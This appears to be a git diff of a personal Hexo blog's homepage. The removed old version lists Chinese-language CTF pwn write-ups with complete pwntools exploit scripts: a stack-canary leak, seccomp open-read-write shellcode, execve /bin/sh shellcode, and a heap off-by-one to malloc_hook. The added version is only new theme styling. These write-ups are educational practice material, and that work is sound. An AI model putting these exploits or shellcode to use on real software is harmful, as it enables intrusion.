@@ -1,689 +1,690 @@
-
-
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-	<title> [ your blog title ]</title>
-	
-	
-	<!-- stylesheets list from _config.yml -->
-	
-	<link rel="stylesheet" href="/css/PreciousJoy.css">
-	
-	<link rel="stylesheet" href="/css/top-bar.css">
-	
-	<link rel="stylesheet" href="/css/menu-outer.css">
-	
-	<link rel="stylesheet" href="/css/content-outer.css">
-	
-	<link rel="stylesheet" href="/css/bottom-outer.css">
-	
-	<link rel="stylesheet" href="/css/atom-one-dark.css">
-	
-	<link rel="stylesheet" href="/css/recent-posts-item.css">
-	
-	<link rel="stylesheet" href="/css/article-sidebar-toc.css">
-	
-	<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
-	
-	<link rel="stylesheet" href="/css/search.css">
-	
-	<link rel="stylesheet" href="/css/toc.css">
-	
-	<link rel="stylesheet" href="/css/sidebar.css">
-	
-	<link rel="stylesheet" href="/css/archive.css">
-	
-	<link rel="stylesheet" href="/css/jquery.mCustomScrollbar.min.css">
-	
-	<link rel="stylesheet" href="/css/Z-last-cover-others.css">
-	
-	
-	
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-
-
-
-<body id="wrapper">
-
-	<div id="">
-		
-		<div id="top-bar">
-			
-			<div id="avatar-box">
-				<img 
-				class="avatar"
-				src="/images/default-avatar.jpg" 
-				alt="avatar">
-			</div>
-
-			<div id="top-bar-text">
-				<div id="top-bar-title">
-					pa1n
-				</div>
-				<div id="top-bar-slogan">
-					
-				</div>
-			</div>
-
-		</div>
-
-		<div id="menu-outer">
-			<div id="menu-inner">
-				
-				
-				<div class="menu-item">
-					<a href="/">Home</a>
-				</div>
-				
-				<div class="menu-item">
-					<a href="/about">About</a>
-				</div>
-				
-				<div class="menu-item">
-					<a href="/archives">Archives</a>
-				</div>
-				
-
-				<div class="menu-item menu-item-search">
-					
-  <span class="local-search local-search-google local-search-plugin">
-      <input type="search" placeholder="站内搜索" id="local-search-input" class="local-search-input-cls" style="">
-      <div id="local-search-result" class="local-search-result-cls"></div>
-  </span>
-	
-				</div>
-
-			</div>
-		</div>
-
-		<div id="content-outer">
-			<div id="content-inner">
-
-				
-
-<div id="recent-posts-box">
-
+  <meta charset="utf-8">
   
-  <div id="recent-posts">
-    <!-- <h1>Recent Posts</h1> -->
-    
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/03/23/GUESS/" class="item-title">GUESS</a>
-      
-      <time datetime="2024-03-23T10:34:29.000Z">
-        2024-03-23
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 开了canary
-
-在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数
-把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移本地一直打不通，调试也有问题expfrom pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node5.buuoj.cn&quot;,26222)
-p=process(&quot;./GUESS&quot;)
-context.log_level=&quot;debug&quot;
-elf=ELF(&#39;./GUESS&#39;)
-puts_got=elf.got[&#39;puts&#39;]
-libc=ELF(&#39;./libc-2.23.so&#39;)
-payload=b&#39;a&#39;*0x128+p64(puts_ -->
-        <!-- </div> -->
-
-        
-        <p>开了canary</p>
-<p><img src="https://i0.imgs.ovh/2024/03/22/gkJhl.png" alt="image-20240323183540854"></p>
-<h5 id="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数"><a href="#在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数" class="headerlink" title="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数"></a>在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数</h5><p><img src="https://i0.imgs.ovh/2024/03/22/gsrOt.png" alt="image-20240323211819577"></p>
-<h5 id="把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"><a href="#把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移" class="headerlink" title="把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"></a>把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移</h5><h5 id="本地一直打不通，调试也有问题"><a href="#本地一直打不通，调试也有问题" class="headerlink" title="本地一直打不通，调试也有问题"></a>本地一直打不通，调试也有问题</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node5.buuoj.cn&quot;,26222)
-p=process(&quot;./GUESS&quot;)
-context.log_level=&quot;debug&quot;
-elf=ELF(&#39;./GUESS&#39;)
-puts_got=elf.got[&#39;puts&#39;]
-libc=ELF(&#39;./libc-2.23.so&#39;)
-payload=b&#39;a&#39;*0x128+p64(puts_got)
-p.recvuntil(&#39; guessing flag&#39;)
-
-p.sendline(payload)
-p.recvuntil(&#39;detected ***: &#39;)
-puts_addr=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))
-print(hex(puts_addr))
-base=puts_addr-libc.sym[&#39;puts&#39;]
-environ=base+libc.sym[&#39;__environ&#39;]
-payload=b&#39;a&#39;*0x128+p64(environ)
-gdb.attach(p)
-p.recvuntil(&#39; guessing flag&#39;)
-p.sendline(payload)
-
-p.recvuntil(&#39;detected ***: &#39;)
-envi=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))
-print(hex(envi))
-flag=envi-0x168
-payload=b&#39;a&#39;*0x128+p64(flag)
-p.recvuntil(&#39; guessing flag&#39;)
-p.sendline(payload)
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/03/23/GUESS/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/03/22/bad/" class="item-title">bad</a>
-      
-      <time datetime="2024-03-22T06:08:42.000Z">
-        2024-03-22
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 
-
-
-很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用seccomp_init(0LL);是初始化seccomp_init函数0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用
-所以这道题只能用orw的方式获取flagmmap=0x123000
-orw_payload=shellcraft.open(&#39;./flag&#39;) #打开根目录下的flag文件，文件标识符为3
-orw_payload+=shellcraft.read(3,mmap,0x50) #读取文件标识符为3的文件的0x50个字节到地址mmap
-orw_payload+=shellcraft.write(1,mmap,0x50) #将mmap的地址的值输出
-
-不把orw_payload写到栈上因为其很大
-所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上
-jmp_rsp_ret -->
-        <!-- </div> -->
-
-        
-        <p><img src="https://i0.imgs.ovh/2024/03/21/eN68l.png" alt="image-20240322140930289"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/21/eNkFd.png" alt="image-20240322141022925"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/21/eN0sK.png" alt="image-20240322141035709"></p>
-<h5 id="很明显地用shellcode写，不过不能用一般的shellcode来写-平时的shellcode是用通过系统调用exceve-‘bin-sh’-0-0-正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用"><a href="#很明显地用shellcode写，不过不能用一般的shellcode来写-平时的shellcode是用通过系统调用exceve-‘bin-sh’-0-0-正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用" class="headerlink" title="很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用"></a>很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用</h5><h5 id="seccomp-init-0LL-是初始化seccomp-init函数"><a href="#seccomp-init-0LL-是初始化seccomp-init函数" class="headerlink" title="seccomp_init(0LL);是初始化seccomp_init函数"></a><strong><em>seccomp_init(0LL);</em></strong>是初始化seccomp_init函数</h5><h5 id="0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用"><a href="#0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用" class="headerlink" title="0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用"></a><strong><em>0，1，2，60</em></strong>，分别是允许进程可读，可写，可执行，和退出的系统调用</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eNBi2.png" alt="image-20240322141910159"></p>
-<h5 id="所以这道题只能用orw的方式获取flag"><a href="#所以这道题只能用orw的方式获取flag" class="headerlink" title="所以这道题只能用orw的方式获取flag"></a>所以这道题只能用orw的方式获取flag</h5><pre><code class="lang-py">mmap=0x123000
-orw_payload=shellcraft.open(&#39;./flag&#39;) #打开根目录下的flag文件，文件标识符为3
-orw_payload+=shellcraft.read(3,mmap,0x50) #读取文件标识符为3的文件的0x50个字节到地址mmap
-orw_payload+=shellcraft.write(1,mmap,0x50) #将mmap的地址的值输出
-</code></pre>
-<h5 id="不把orw-payload写到栈上因为其很大"><a href="#不把orw-payload写到栈上因为其很大" class="headerlink" title="不把orw_payload写到栈上因为其很大"></a>不把orw_payload写到栈上因为其很大</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eaafo.png" alt="image-20240322151355993"></p>
-<h5 id="所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上"><a href="#所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上" class="headerlink" title="所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上"></a>所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上</h5><p><img src="https://i0.imgs.ovh/2024/03/21/ea9JH.png" alt="image-20240322151126619"></p>
-<pre><code class="lang-py">jmp_rsp_ret=asm(&#39;sub rsp,0x30;jmp rsp&#39;)
-get_shell=asm(&#39;mov rax,0x123000;call rax&#39;)
-payload=asm(shellcraft.read(0,mmap,0x100))+get_shell
-payload=payload.ljust(0x28,b&#39;\x00&#39;)
-payload+=p64(jmp_rsp)+jmp_rsp_ret#
-</code></pre>
-<h5 id="实践证明，返回地址不能直接sub-rsp-0x30-jmp-rsp-得先jmp-esp-不然会报错，但我觉得最终的结果都差不多，但是不行。"><a href="#实践证明，返回地址不能直接sub-rsp-0x30-jmp-rsp-得先jmp-esp-不然会报错，但我觉得最终的结果都差不多，但是不行。" class="headerlink" title="实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。"></a>实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。</h5><h5 id="最后再写入orw-payload就行了"><a href="#最后再写入orw-payload就行了" class="headerlink" title="最后再写入orw_payload就行了"></a>最后再写入orw_payload就行了</h5><pre><code class="lang-py">p.sendline(asm(orw_payload))
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/03/22/bad/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/03/20/b0verfl0w/" class="item-title">b0verfl0w</a>
-      
-      <time datetime="2024-03-20T15:07:25.000Z">
-        2024-03-20
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- ; 汇编指令
-xor ecx, ecx          ; 将 ecx 寄存器清零
-mul ecx               ; 将 eax 寄存器中的值与 ecx 寄存器中的值相乘，结果存放在 eax 和 edx 中，相当于 edx = eax * 0
-push ecx              ; 将 ecx 寄存器中的值压入栈，此时栈顶为 0
-push 0x68732f2f       ; 将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
-push 0x6e69622f       ; 继续将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
-mov ebx, esp          ; 将 esp 寄存器中的值（即字符串 &quot;/bin//sh&quot; 的地址）存放到 ebx 寄存器中
-mov al, 0xb           ; 将 0xb 存放到 al 寄存器中，该值代表 execve 系统调用的编号
-int 0x80              ; 触发系统调用，执行 execve(&quot;/ -->
-        <!-- </div> -->
-
-        
-        <pre><code class="lang-py">; 汇编指令
-xor ecx, ecx          ; 将 ecx 寄存器清零
-mul ecx               ; 将 eax 寄存器中的值与 ecx 寄存器中的值相乘，结果存放在 eax 和 edx 中，相当于 edx = eax * 0
-push ecx              ; 将 ecx 寄存器中的值压入栈，此时栈顶为 0
-push 0x68732f2f       ; 将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
-push 0x6e69622f       ; 继续将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
-mov ebx, esp          ; 将 esp 寄存器中的值（即字符串 &quot;/bin//sh&quot; 的地址）存放到 ebx 寄存器中
-mov al, 0xb           ; 将 0xb 存放到 al 寄存器中，该值代表 execve 系统调用的编号
-int 0x80              ; 触发系统调用，执行 execve(&quot;/bin//sh&quot;, NULL, NULL)
-</code></pre>
-<pre><code class="lang-py">shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;+b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;+b&quot;\x0b\xcd\x80&quot;
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2024/03/19/eJhTA.png" alt="image-20240320230854571"></p>
-<h5 id="ret2shellcode-但是大小不够了"><a href="#ret2shellcode-但是大小不够了" class="headerlink" title="ret2shellcode,但是大小不够了"></a>ret2shellcode,但是大小不够了</h5><p><img src="https://i0.imgs.ovh/2024/03/19/eJKbs.png" alt="image-20240320231042503"></p>
-<pre><code class="lang-py">sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;)
-</code></pre>
-<h5 id="改写其他不行"><a href="#改写其他不行" class="headerlink" title="改写其他不行"></a>改写其他不行</h5><h5 id="返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址"><a href="#返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址" class="headerlink" title="返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址"></a>返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址</h5><pre><code class="lang-py">payload=asm(shellcode)+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sup_esp_jmp
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2024/03/19/eJ8qV.png" alt="image-20240320234818524"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/eJEnJ.png" alt="image-20240320234859035"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/eJToW.png" alt="image-20240320234951277"></p>
-<h5 id="jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶"><a href="#jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶" class="headerlink" title="jmp esp的操作，把栈顶设为esp,同时eip指向栈顶"></a>jmp esp的操作，把栈顶设为esp,同时eip指向栈顶</h5><p><img src="https://i0.imgs.ovh/2024/03/20/eimXu.png" alt="image-20240321125420592"></p>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node5.buuoj.cn&quot;,28594)
-p=process(&quot;./b0verfl0w&quot;)
-context.log_level=&quot;debug&quot;
-context.arch=&#39;i386&#39;
-
-shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;+b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;+b&quot;\x0b\xcd\x80&quot;
-
-print(len(shellcode))
-#gdb.attach(p)
-sleep(1)
-jmp_esp=0x08048504
-sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;)
-payload=shellcode+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sub_esp_jmp
-#p.sendline(payload)
-
-p.sendline(payload)
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/03/20/b0verfl0w/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/03/18/roarctf-2019-easy-pwn/" class="item-title">roarctf_2019_easypwn</a>
-      
-      <time datetime="2024-03-18T15:03:09.000Z">
-        2024-03-18
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!--  保护全开
-edit函数
-
-若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞
-
-这里不太懂为什么伪造的堆1 free不会报错
-free(1)
-
-
-add(0x90)
-
-
-试用这种方法也能show出main_arena
-
-
-至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小
-add(0x80)
-
-奇怪，这里再申请0x80的大小，然后size还是0xa1
-
-这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)
-
-
-
-不过最后的话，是打不通的。expfrom pwn import *
-
-r=remote(&#39;node5.buuoj.cn&#39;,28118)
-#r=process(&#39;roarctf_2019_easy_pwn&#39;)
-libc=ELF(&#39;./libc-2.23.so&#39;)
-context.log_level=&quot;debug&quot;
-
-de -->
-        <!-- </div> -->
-
-        
-        <p> 保护全开</p>
-<p>edit函数</p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7kas.png" alt="image-20240320152622842"></p>
-<p>若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞</p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7IOU.png" alt="image-20240320153710315"></p>
-<h4 id="这里不太懂为什么伪造的堆1-free不会报错"><a href="#这里不太懂为什么伪造的堆1-free不会报错" class="headerlink" title="这里不太懂为什么伪造的堆1 free不会报错"></a>这里不太懂为什么伪造的堆1 free不会报错</h4><p><img src="https://i0.imgs.ovh/2024/03/19/e7wKH.png" alt="image-20240319203609474"></p>
-<pre><code class="lang-py">free(1)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7pZO.png" alt="image-20240319204503356"></p>
-<pre><code class="lang-py">add(0x90)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7HD9.png" alt="image-20240319204909619"></p>
-<p>试用这种方法也能show出main_arena</p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7nO3.png" alt="image-20240319205416560"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7lwe.png" alt="image-20240319211634694"></p>
-<h4 id="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"><a href="#至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小" class="headerlink" title="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"></a>至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小</h4><p><img src="https://i0.imgs.ovh/2024/03/18/eKiYo.png" alt="image-20240319233028210"></p>
-<pre><code class="lang-py">add(0x80)
-</code></pre>
-<h5 id="奇怪，这里再申请0x80的大小，然后size还是0xa1"><a href="#奇怪，这里再申请0x80的大小，然后size还是0xa1" class="headerlink" title="奇怪，这里再申请0x80的大小，然后size还是0xa1"></a>奇怪，这里再申请0x80的大小，然后size还是0xa1</h5><p><img src="https://i0.imgs.ovh/2024/03/19/e73jD.png" alt="image-20240319213208476"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7mLo.png" alt="image-20240319214042015"></p>
-<h5 id="这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21"><a href="#这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21" class="headerlink" title="这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)"></a>这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)</h5><pre><code class="lang-py">payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e760A.png" alt="image-20240319214344529"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7Wt5.png" alt="image-20240319214501997"></p>
-<h5 id="不过最后的话，是打不通的。"><a href="#不过最后的话，是打不通的。" class="headerlink" title="不过最后的话，是打不通的。"></a>不过最后的话，是打不通的。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *
-
-r=remote(&#39;node5.buuoj.cn&#39;,28118)
-#r=process(&#39;roarctf_2019_easy_pwn&#39;)
-libc=ELF(&#39;./libc-2.23.so&#39;)
-context.log_level=&quot;debug&quot;
-
-def add(size):
-    r.recvuntil(&#39;choice: &#39;)
-    r.sendline(&#39;1&#39;)
-    r.recvuntil(&#39;size:&#39;)
-    r.sendline(str(size))
-
-def edit(index,size,data):
-    r.recvuntil(&#39;choice: &#39;)
-    r.sendline(&#39;2&#39;)
-    r.recvuntil(&#39;index:&#39;)
-    r.sendline(str(index))
-    r.recvuntil(&#39;size:&#39;)
-    r.sendline(str(size))
-    r.recvuntil(&#39;content:&#39;)
-    r.send(data)
-
-def free(index):
-    r.recvuntil(&#39;choice: &#39;)
-    r.sendline(&#39;3&#39;)
-    r.recvuntil(&#39;index:&#39;)
-    r.sendline(str(index))
-
-def show(index):
-    r.recvuntil(&#39;choice: &#39;)
-    r.sendline(&#39;4&#39;)
-    r.recvuntil(&#39;index:&#39;)
-    r.sendline(str(index))  
-
-add(0x18)
-add(0x10)
-add(0x90)
-add(0x10)
-
-edit(0,0x22,b&#39;b&#39;*0x10+p64(0x20)+p8(0xa1))
-
-edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21))
-
-free(1)
-add(0x90)
-
-edit(1,0x20,p64(0)*3+p64(0xa1))
-free(2)
-show(1)
-r.recvuntil(&#39;content:&#39;)
-r.recv(0x20)
-main_arena=u64(r.recvuntil(&#39;\x7f&#39;).strip()[-6:].ljust(8,b&#39;\x00&#39;))-88
-malloc_hook=main_arena-0x10
-base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
-realloc_hook=base+libc.sym[&#39;__realloc_hook&#39;]
-add(0x80)
-print(hex(main_arena))
-payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)
-edit(1,0x90,payload)
-free(2)
-
-payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)
-edit(1,0x28,payload)
-add(0x60) #2
-
-add(0x60) #4
-
-one=[0x45216,0x4526a,0xf02a4,0xf1147]
-one_gadget=base+one[3]
-edit(4,0x1b,b&#39;a&#39;*11+p64(one_gadget)+p64(realloc_hook+4))
-#gdb.attach(r)
-sleep(1)
-add(0x10)
-
-r.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/03/18/roarctf-2019-easy-pwn/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/03/18/ciscn-2019-es-7/" class="item-title">ciscn_2019_es_7</a>
-      
-      <time datetime="2024-03-18T13:09:07.000Z">
-        2024-03-18
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- 初遇srop
-
-unix在系统发生signal时会间接调用sigreturn,ucontext,siginfo等会被压入栈中,这一段称为signal frame
-
-要用srop，需满足几个条件
-可以通过栈溢出控制栈的内容。
-需要知道相应的地址。
-     “/bin/sh”
-​        Signal Frame
-​        syscall
-​        sigreturn
-题目中已经给了我们gadgets的地址
-首先可以打印出栈地址
-
-其次返回地址写上了0x4004F1,打印完会再次返回func函数
-
- -->
-        <!-- </div> -->
-
-        
-        <h5 id="初遇srop"><a href="#初遇srop" class="headerlink" title="初遇srop"></a>初遇srop</h5><p><img src="https://i0.imgs.ovh/2024/03/17/e3xQs.png" alt="image-20240318211119440"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/17/e3KTX.png" alt="image-20240318211144301"></p>
-<p>unix在系统发生signal时会间接调用sigreturn,ucontext,siginfo等会被压入栈中,这一段称为signal frame</p>
-<p><img src="https://i0.imgs.ovh/2024/03/17/e3olU.png" alt="image-20240318212003314"></p>
-<p>要用srop，需满足几个条件</p>
-<p>可以通过栈溢出控制栈的内容。</p>
-<p>需要知道相应的地址。</p>
-<pre><code>     “/bin/sh”
-</code></pre><p>​        Signal Frame</p>
-<p>​        syscall</p>
-<p>​        sigreturn</p>
-<p>题目中已经给了我们gadgets的地址</p>
-<p>首先可以打印出栈地址</p>
-<p><img src="https://i0.imgs.ovh/2024/03/17/e3QBm.png" alt="image-20240318213204641"></p>
-<p>其次返回地址写上了0x4004F1,打印完会再次返回func函数</p>
-<p><img src="https://i0.imgs.ovh/2024/03/17/e3cvR.png" alt="image-20240318214547353"></p>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/03/18/ciscn-2019-es-7/"> Read more -->
-          </span>
-        </div>
-
-        
+  <title>我的技术与生活——小站首页 | lonely is alwals</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——小站首页`
+  </script>
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
